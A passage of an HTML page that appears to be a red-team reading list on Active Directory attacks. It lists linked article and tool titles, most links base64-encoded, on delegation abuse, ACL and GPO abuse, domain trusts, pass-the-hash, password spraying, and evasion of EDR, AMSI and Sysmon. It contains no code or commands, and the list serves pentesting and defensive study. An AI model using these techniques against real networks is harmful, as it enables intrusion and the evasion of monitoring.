data-url=\"aHR0cHM6Ly93d3cucmljY2FyZG9hbmNhcmFuaS5pdC9leHBsb2l0aW5nLXVuY29uc3RyYWluZWQtZGVsZWdhdGlvbi8=\">Exploiting Unconstrained Delegation</span></li>\n</ul>\n<h4 id=\"constrained-delegation\"><a class=\"anchor\" href=\"#constrained-delegation\">#</a> Constrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2Fub3RoZXItd29yZC1vbi1kZWxlZ2F0aW9uLw==\">Another Word on Delegation</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2Zyb20ta2VrZW8tdG8tcnViZXVzLw==\">From Kekeo to Rubeus</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9zNHUycHduYWdlLw==\">S4U2Pwnage</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJlYXV0aC5jb20vYmxvZy9rZXJiZXJvcy1kZWxlZ2F0aW9uLXNwbnMtYW5kLW1vcmU=\">Kerberos Delegation, Spns And More...</span></li>\n</ul>\n<h4 id=\"resource-based-constrained-delegation\"><a class=\"anchor\" href=\"#resource-based-constrained-delegation\">#</a> Resource-Based Constrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGVuYW5pZ2Fuc2xhYnMuaW8vMjAxOS8wMS8yOC9XYWdnaW5nLXRoZS1Eb2cuaHRtbA==\">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcmVkLnRlYW0vb2ZmZW5zaXZlLXNlY3VyaXR5LWV4cGVyaW1lbnRzL2FjdGl2ZS1kaXJlY3Rvcnkta2VyYmVyb3MtYWJ1c2UvcmVzb3VyY2UtYmFzZWQtY29uc3RyYWluZWQtZGVsZWdhdGlvbi1hZC1jb21wdXRlci1vYmplY3QtdGFrZS1vdmVyLWFuZC1wcml2aWxnZWQtY29kZS1leGVjdXRpb24=\">Kerberos Resource-based Constrained Delegation: Computer Object Take Over</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9yZXNvdXJjZS1iYXNlZC1jb25zdHJhaW5lZC1kZWxlZ2F0aW9uLWFidXNlLw==\">Resource Based Constrained Delegation</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9hLWNhc2Utc3R1ZHktaW4td2FnZ2luZy10aGUtZG9nLWNvbXB1dGVyLXRha2VvdmVyLw==\">A Case Study in Wagging the Dog: Computer Takeover</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1SVWJBREhjQkxLZw==\">BloodHound 2.1's New Computer Takeover Attack</span></li>\n</ul>\n<h3 id=\"insecure-group-policy-object-permission-rights\"><a class=\"anchor\" href=\"#insecure-group-policy-object-permission-rights\">#</a> Insecure Group Policy Object Permission Rights</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2FidXNpbmctZ3BvLXBlcm1pc3Npb25zLw==\">Abusing GPO Permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxkMC5jb20vP3A9MTc5\">A Red Teamer’s Guide to GPOs and OUs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Jhc3RhLW1vdXNlL0dQTy1BYnVzZQ==\">File templates for GPO Abuse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTkvMDEvZ3BvLWFidXNlLXBhcnQtMS8=\">GPO Abuse - Part 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnMvU2hhcnBHUE9BYnVzZQ==\">SharpGPOAbuse</span></li>\n</ul>\n<h3 id=\"insecure-acls-permission-rights\"><a class=\"anchor\" href=\"#insecure-acls-permission-rights\">#</a> Insecure ACLs Permission Rights</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHBsb2l0aW5nLXdlYWstYWN0aXZlLWRpcmVjdG9yeS1wZXJtaXNzaW9ucy13aXRoLXBvd2Vyc3Bsb2l0Lw==\">Exploiting Weak Active Directory Permissions With Powersploit</span></li>\n<li><a href=\"https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/\">Escalating privileges with ACLs in Active Directory<br />\n</a></li>\n<li><a href=\"http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/\">Abusing Active Directory Permissions with PowerView<br />\n</a></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxkMC5jb20vP3A9MTEy\">BloodHound 1.3 – The ACL Attack Path Update</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNjU4\">Scanning for Active Directory Privileges &amp; Privileged Accounts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoY29tbXVuaXR5Lm1pY3Jvc29mdC5jb20vdDUvRW50ZXJwcmlzZS1Nb2JpbGl0eS1TZWN1cml0eS9BY3RpdmUtRGlyZWN0b3J5LUFjY2Vzcy1Db250cm9sLUxpc3QtODIxMS1BdHRhY2tzLWFuZC1EZWZlbnNlL2JhLXAvMjUwMzE1\">Active Directory Access Control List – Attacks and Defense</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRGlya2phbk1vbGxlbWEvYWNscHduLWFjdGl2ZS1kaXJlY3RvcnktYWNsLWV4cGxvaXRhdGlvbi13aXRoLWJsb29kaG91bmQ=\">aclpwn - Active Directory ACL exploitation with BloodHound</span></li>\n</ul>\n<h3 id=\"domain-trusts\"><a class=\"anchor\" href=\"#domain-trusts\">#</a> Domain Trusts</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3JlZHRlYW1pbmcvYS1ndWlkZS10by1hdHRhY2tpbmctZG9tYWluLXRydXN0cy8=\">A Guide to Attacking Domain Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNTg4\">It's All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaXJramFubS5pby9hY3RpdmUtZGlyZWN0b3J5LWZvcmVzdC10cnVzdHMtcGFydC1vbmUtaG93LWRvZXMtc2lkLWZpbHRlcmluZy13b3Jr\">Active Directory forest trusts part 1 - How does SID filtering work?</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbWFnLmNvbS9zZWN1cml0eS9hZC1mb3Jlc3Qv\">The Forest Is Under Control. Taking over the entire Active Directory forest</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL25vdC1hLXNlY3VyaXR5LWJvdW5kYXJ5LWJyZWFraW5nLWZvcmVzdC10cnVzdHMtY2QxMjU4Mjk1MThk\">Not A Security Boundary: Breaking Forest Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3JlZHRlYW1pbmcvdGhlLXRydXN0cG9jYWx5cHNlLw==\">The Trustpocalypse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy9pbHpqdGxvMHZieXUxdTAvQ2FybG9zJTIwR2FyY2lhJTIwLSUyMFJvb3RlZDIwMTklMjAtJTIwUGVudGVzdGluZyUyMEFjdGl2ZSUyMERpcmVjdG9yeSUyMEZvcmVzdHMlMjBwdWJsaWMucGRmP2RsPTA=\">Pentesting Active Directory Forests</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yODI=\">Security Considerations for Active Directory (AD) Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjQw\">Kerberos Golden Tickets are Now More Golden</span></li>\n</ul>\n<h3 id=\"dcshadow\"><a class=\"anchor\" href=\"#dcshadow\">#</a> DCShadow</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wcml2aWxlZ2UtZXNjYWxhdGlvbi13aXRoLWRjc2hhZG93Lw==\">Privilege Escalation With DCShadow</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8xNi9kY3NoYWRvdy8=\">DCShadow</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=\">DCShadow explained: A technical deep dive into the latest AD attack technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8wNS9kY3NoYWRvdy1zYWNsLmh0bWw=\">DCShadow - Silently turn off Active Directory Auditing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8wNC9kY3NoYWRvdy5odG1s\">DCShadow - Minimal permissions, Active Directory Deception, Shadowception and more</span></li>\n</ul>\n<h3 id=\"rid\"><a class=\"anchor\" href=\"#rid\">#</a> RID</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9yaWQtaGlqYWNraW5nLXdoZW4tZ3Vlc3RzLWJlY29tZS1hZG1pbnMv\">Rid Hijacking: When Guests Become Admins</span></li>\n</ul>\n<h3 id=\"microsoft-sql-server\"><a class=\"anchor\" href=\"#microsoft-sql-server\">#</a> Microsoft SQL Server</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZ2V0LXNxbC1zZXJ2ZXItc3lzYWRtaW4tcHJpdmlsZWdlcy1sb2NhbC1hZG1pbi1wb3dlcnVwc3FsLw==\">How to get SQL Server Sysadmin Privileges as a Local Admin with PowerUpSQL</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jb21wcm9taXNlLXdpdGgtcG93ZXJ1cHNxbC1zcWwtYXR0YWNrcy8=\">Compromise With Powerupsql – Sql Attacks</span></li>\n</ul>\n<h3 id=\"red-forest\"><a class=\"anchor\" href=\"#red-forest\">#</a> Red Forest</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5lcm53LWluc2lnaHQuZGUvdHJvb3BlcnMvdHIxOC9zbGlkZXMvVFIxOF9BRF9BdHRhY2stYW5kLURlZmVuZC1NaWNyb3NvZnQtRW5oYW5jZWQtU2VjdXJpdHkucGRm\">Attack and defend Microsoft Enhanced Security Administrative</span></li>\n</ul>\n<h3 id=\"exchange\"><a class=\"anchor\" href=\"#exchange\">#</a> Exchange</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dkZWRyb3Vhcy9FeGNoYW5nZS1BRC1Qcml2ZXNj\">Exchange-AD-Privesc</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaXJramFubS5pby9hYnVzaW5nLWV4Y2hhbmdlLW9uZS1hcGktY2FsbC1hd2F5LWZyb20tZG9tYWluLWFkbWluLw==\">Abusing Exchange: One API call away from Domain Admin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Fybm8weC9OdGxtUmVsYXlUb0VXUw==\">NtlmRelayToEWS</span></li>\n</ul>\n<h3 id=\"llmnrnbns\"><a class=\"anchor\" href=\"#llmnrnbns\">#</a> LLMNR/NBNS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubm90c29zZWN1cmUuY29tL3B3bmluZy13aXRoLXJlc3BvbmRlci1hLXBlbnRlc3RlcnMtZ3VpZGUv\">Pwning with Responder – A Pentester’s Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXQzYmwzM2Qzci5naXRodWIuaW8vcHJhY3RpY2FsLWd1aWRlLXRvLW50bG0tcmVsYXlpbmctaW4tMjAxNy1ha2EtZ2V0dGluZy1hLWZvb3Rob2xkLWluLXVuZGVyLTUtbWludXRlcy5odG1s\">Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZm94LWl0LmNvbS9lbi9pbnNpZ2h0cy9ibG9ncy9ibG9nL2luc2lkZS13aW5kb3dzLW5ldHdvcmsv\">Relaying credentials everywhere with ntlmrelayx</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZXhwbG9pdGluZy1hZGlkbnMv\">Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS</span></li>\n</ul>\n<hr />\n<h2 id=\"lateral-movement\"><a class=\"anchor\" href=\"#lateral-movement\">#</a> Lateral Movement</h2>\n<h3 id=\"microsoft-sql-server-database-links\"><a class=\"anchor\" href=\"#microsoft-sql-server-database-links\">#</a> Microsoft SQL Server Database links</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vaG93LXRvLWhhY2stZGF0YWJhc2UtbGlua3MtaW4tc3FsLXNlcnZlci8=\">SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vc3FsLXNlcnZlci1saW5rLWNyYXdsaW5nLXBvd2VydXBzcWwv\">SQL Server Link Crawling with PowerUpSQL</span></li>\n</ul>\n<h3 id=\"pass-the-hash\"><a class=\"anchor\" href=\"#pass-the-hash\">#</a> Pass The Hash</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wYXNzaW5nLXRoZS1oYXNoLXdpdGgtbWltaWthdHo=\">Performing Pass-the-hash Attacks With Mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8yMS9ob3ctdG8tcGFzcy10aGUtaGFzaC13aXRoLW1pbWlrYXR6Lw==\">How to Pass-the-Hash with Mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL3Bhc3MtdGhlLWhhc2gtaXMtZGVhZC1sb25nLWxpdmUtbG9jYWxhY2NvdW50dG9rZW5maWx0ZXJwb2xpY3kv\">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</span></li>\n</ul>\n<h3 id=\"system-center-configuration-manager-sccm\"><a class=\"anchor\" href=\"#system-center-configuration-manager-sccm\">#</a> System Center Configuration Manager (SCCM)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTUvMTAvMjcvdGFyZ2V0ZWQtd29ya3N0YXRpb24tY29tcHJvbWlzZS13aXRoLXNjY20v\">Targeted Workstation Compromise With Sccm</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNDQ00=\">PowerSCCM - PowerShell module to interact with SCCM deployments</span></li>\n</ul>\n<h3 id=\"wsus\"><a class=\"anchor\" href=\"#wsus\">#</a> WSUS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2l4ZHViLm5ldC8/cD02MjM=\">Remote Weaponization of WSUS MITM</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvd2VkbmVzZGF5L3VzLTE3LUNvbHRlbC1XU1VTcGVuZHUtVXNlLVdTVVMtVG8tSGFuZy1JdHMtQ2xpZW50cy13cC5wZGY=\">WSUSpendu</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9panVzdHdhbm5hcmVkLnRlYW0vMjAxOC8xMC8xNS9sZXZlcmFnaW5nLXdzdXMtcGFydC1vbmUv\">Leveraging WSUS – Part One</span></li>\n</ul>\n<h3 id=\"password-spraying\"><a class=\"anchor\" href=\"#password-spraying\">#</a> Password Spraying</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj14QjI2UWhuTDY0Yw==\">Password Spraying Windows Active Directory Accounts - Tradecraft Security Weekly #5</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2F0dGFja2luZy1leGNoYW5nZS13aXRoLW1haWxzbmlwZXIv\">Attacking Exchange with MailSniper</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnMvU3ByYXk=\">A Password Spraying tool for Active Directory Credentials by Jacob Wilkin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL1NwcmF5aW5nVG9vbGtpdA==\">SprayingToolkit</span></li>\n</ul>\n<h3 id=\"automated-lateral-movement\"><a class=\"anchor\" href=\"#automated-lateral-movement\">#</a> Automated Lateral Movement</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dvRmV0Y2hBRC9Hb0ZldGNo\">GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0RlYXRoU3Rhcg==\">DeathStar - Automate getting Domain Admin using Empire</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0FOR1JZUFVQUFk=\">ANGRYPUPPY - Bloodhound Attack Path Automation in CobaltStrike</span></li>\n</ul>\n<hr />\n<h2 id=\"defense-evasion\"><a class=\"anchor\" href=\"#defense-evasion\">#</a> Defense Evasion</h2>\n<h3 id=\"in-memory-evasion\"><a class=\"anchor\" href=\"#in-memory-evasion\">#</a> In-Memory Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9leHBlcmltZW50aW5nLWJ5cGFzc2luZy1tZW1vcnktc2Nhbm5lcnMtd2l0aC1jb2JhbHQtc3RyaWtlLWFuZC1nYXJnb3lsZS8=\">Bypassing Memory Scanners with Cobalt Strike and Gargoyle</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vcGxheWxpc3Q/bGlzdD1QTDlITzZNX01VMm5jNVEzMXFkMkN3cFo4SjRLRk1oZ25L\">In-Memory Evasions Course</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vYmxvZy90aHJlYXQtcmVzZWFyY2gvMjAxOC8wNi9icmluZy15b3VyLW93bi1sYW5kLW5vdmVsLXJlZC10ZWFtaW5nLXRlY2huaXF1ZS5odG1s\">Bring Your Own Land (BYOL) – A Novel Red Teaming Technique</span></li>\n</ul>\n<h3 id=\"endpoint-detection-and-response-edr-evasion\"><a class=\"anchor\" href=\"#endpoint-detection-and-response-edr-evasion\">#</a> Endpoint Detection and Response (EDR) Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly95b3V0dS5iZS9sOG5rWENPWVFDNA==\">Red Teaming in the EDR age</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Z1enp5U2VjdXJpdHkvU2hhcnAtU3VpdGU=\">Sharp-Suite - Process Argument Spoofing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vdXRmbGFuay5ubC9ibG9nLzIwMTkvMDYvMTkvcmVkLXRlYW0tdGFjdGljcy1jb21iaW5pbmctZGlyZWN0LXN5c3RlbS1jYWxscy1hbmQtc3JkaS10by1ieXBhc3MtYXYtZWRyLw==\">Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY291bnRlcmNlcHQuY29tL2Jsb2cvZGVjaGFpbmluZy1tYWNyb3MtYW5kLWV2YWRpbmctZWRyLw==\">Dechaining Macros and Evading EDR</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bmc3gzMC9ieXBhc3MtZWRycy1tZW1vcnktcHJvdGVjdGlvbi1pbnRyb2R1Y3Rpb24tdG8taG9va2luZy0yZWZiMjFhY2ZmZDY=\">Bypass EDR’s memory protection, introduction to hooking</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcmVkLnRlYW0vb2ZmZW5zaXZlLXNlY3VyaXR5L2RlZmVuc2UtZXZhc2lvbi9ieXBhc3NpbmctY3lsYW5jZS1hbmQtb3RoZXItYXZzLWVkcnMtYnktdW5ob29raW5nLXdpbmRvd3MtYXBpcw==\">Bypassing Cylance and other AVs/EDRs by Unhooking Windows APIs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxOS8wMy9zaWxlbmNpbmctY3lsYW5jZS1hLWNhc2Utc3R1ZHktaW4tbW9kZXJuLWVkcnMv\">Silencing Cylance: A Case Study in Modern EDRs</span></li>\n</ul>\n<h3 id=\"opsec\"><a class=\"anchor\" href=\"#opsec\">#</a> OPSEC</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8xMC8yNS9tb2Rlcm4tZGVmZW5zZXMtYW5kLXlvdS8=\">Modern Defenses and YOU!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==\">OPSEC Considerations for Beacon Commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWM1NjQuY29tLyMhZG9jcy90cmFkZWNyYWZ0Lm1k\">Red Team Tradecraft and TTP Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sb3FWdW5YX3NxQQ==\">Fighting the Toolset</span></li>\n</ul>\n<h3 id=\"microsoft-ata-atp-evasion\"><a class=\"anchor\" href=\"#microsoft-ata-atp-evasion\">#</a> Microsoft ATA &amp; ATP Evasion</h3>\n<ul>\n<li><a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf\">Red Team Techniques for Evading, Bypassing, and Disabling MS<br />\nAdvanced Threat Protection and Advanced Threat Analytics</a></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmlraGlsX21pdHRhbC9yZWQtdGVhbS1yZXZlbmdlLWF0dGFja2luZy1taWNyb3NvZnQtYXRh\">Red Team Revenge - Attacking Microsoft ATA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbmlraGlsX21pdHRhbC9ldmFkaW5nLW1pY3Jvc29mdC1hdGEtZm9yLWFjdGl2ZS1kaXJlY3RvcnktZG9taW5hdGlvbg==\">Evading Microsoft ATA for Active Directory Domination</span></li>\n</ul>\n<h3 id=\"powershell-scriptblock-logging-bypass\"><a class=\"anchor\" href=\"#powershell-scriptblock-logging-bypass\">#</a> PowerShell ScriptBlock Logging Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2Jici5pby9TY3JpcHRCbG9jay1Mb2dnaW5nLUJ5cGFzcy5odG1s\">PowerShell ScriptBlock Logging Bypass</span></li>\n</ul>\n<h3 id=\"powershell-anti-malware-scan-interface-amsi-bypass\"><a class=\"anchor\" href=\"#powershell-anti-malware-scan-interface-amsi-bypass\">#</a> PowerShell Anti-Malware Scan Interface (AMSI) Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8weDAwLTB4MDAuZ2l0aHViLmlvL3Jlc2VhcmNoLzIwMTgvMTAvMjgvSG93LXRvLWJ5cGFzcy1BTVNJLWFuZC1FeGVjdXRlLUFOWS1tYWxpY2lvdXMtcG93ZXJzaGVsbC1jb2RlLmh0bWw=\">How to bypass AMSI and execute ANY malicious Powershell code</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU1pdHRhbC1BTVNJLUhvdy1XaW5kb3dzLTEwLVBsYW5zLVRvLVN0b3AtU2NyaXB0LUJhc2VkLUF0dGFja3MtQW5kLUhvdy1XZWxsLUl0LURvZXMtSXQucGRm\">AMSI: How Windows 10 Plans to Stop Script-Based Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL2Ftc2ktYnlwYXNzLXBhdGNoaW5nLXRlY2huaXF1ZS8=\">AMSI Bypass: Patching Technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09tZXJZYS9JbnZpc2ktU2hlbGw=\">Invisi-Shell - Hide your Powershell script in plain sight. Bypass all Powershell security features</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cmV5b3VyaXQuY28udWsvd3AvMjAxOS8wNS8xMC9keW5hbWljLW1pY3Jvc29mdC1vZmZpY2UtMzY1LWFtc2ktaW4tbWVtb3J5LWJ5cGFzcy11c2luZy12YmEv\">Dynamic Microsoft Office 365 AMSI In Memory Bypass Using VBA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTgvMTAvYW1zaXNjYW5idWZmZXItYnlwYXNzLS0tcGFydC0xLw==\">AmsiScanBuffer Bypass - Part 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29udGV4dGlzLmNvbS9lbi9ibG9nL2Ftc2ktYnlwYXNz\">AMSI Bypass</span></li>\n</ul>\n<h3 id=\"loading-net-assemblies-anti-malware-scan-interface-amsi-bypass\"><a class=\"anchor\" href=\"#loading-net-assemblies-anti-malware-scan-interface-amsi-bypass\">#</a> Loading .NET Assemblies Anti-Malware Scan Interface (AMSI) Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbWF0dGlmZXN0YXRpb24vZWYwMTMyYmE0YWUzY2MxMzY5MTRkYTMyYTg4MTA2Yjk=\">A PoC function to corrupt the g_amsiContext global variable in clr.dll in .NET Framework Early Access build 3694</span></li>\n</ul>\n<h3 id=\"applocker-device-guard-bypass\"><a class=\"anchor\" href=\"#applocker-device-guard-bypass\">#</a> AppLocker &amp; Device Guard Bypass</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v\">Living Off The Land Binaries And Scripts - (LOLBins and LOLScripts)</span></li>\n</ul>\n<h3 id=\"sysmon-evasion\"><a class=\"anchor\" href=\"#sysmon-evasion\">#</a> Sysmon Evasion</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hdHRpZmVzdGF0aW9uL0JIVVNBMjAxOF9TeXNtb24=\">Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21rb3JtYW45MC9zeXNtb24tY29uZmlnLWJ5cGFzcy1maW5kZXI=\">sysmon-config-bypass-finder</span></li>\n<li><span class=\"exturl\" 